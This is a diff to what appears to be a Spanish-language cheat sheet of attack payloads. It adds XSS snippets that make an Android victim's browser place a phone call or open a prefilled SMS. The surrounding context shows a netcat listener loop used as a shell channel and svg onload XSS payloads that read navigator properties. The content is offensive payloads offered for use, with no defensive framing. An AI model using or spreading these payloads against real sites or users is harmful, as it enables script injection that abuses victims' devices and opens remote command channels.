@@ -318,6 +318,21 @@ while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
 
 ```
 
+## xss en android para iniciar llamada y enviar mensajes de texto:
+
+```
+onclick="window.location.href='tel:00000000000';"
+
+window.open ("sms:[00000000000]?body=" + "mensaje","_system");
+
+```
+
+
+
+
+
+
+
 ## xss javascript navigator  
 
 ```
@@ -329,6 +344,7 @@ while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
 <svg onload=alert(navigator.onLine)>
 <svg onload=alert(navigator.platform)>
 <svg onload=alert(navigator.userAgent)>
+
 
 ```
 
